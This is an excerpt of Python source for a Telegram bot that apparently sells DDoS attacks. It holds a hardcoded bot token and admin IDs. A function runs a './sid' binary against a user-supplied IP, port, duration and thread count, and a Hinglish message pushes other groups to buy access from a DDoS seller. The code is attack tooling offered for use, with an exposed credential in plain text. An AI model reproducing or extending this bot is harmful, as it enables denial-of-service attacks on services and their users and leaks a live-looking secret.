...
# Hardcoded Bot Token
BOT_TOKEN = '8123262273:AAG8S_cT4uQw8_lLKJx0RPs9nSz6O8z4C2Q'
...
ADMIN_IDS = [1821595166 , 7621229972]# Replace with actual admin IDs
...
async def run_attack_command_on_codespace(bot: telebot.TeleBot, target_ip: str, target_port: int, duration: int, chat_id: int):
    command = f"./sid {target_ip} {target_port} {duration} {THREADS}"
...
def attack_command(message):
    ...
    if message.chat.type == 'supergroup' and chat_id != GROUP_ID:
        ...
        bot.send_message(chat_id, "❌BUY KAR LE YAAR KU FREE KE LIYA GHOOM RAHA H @RAJPUTDDOS❌")
        return
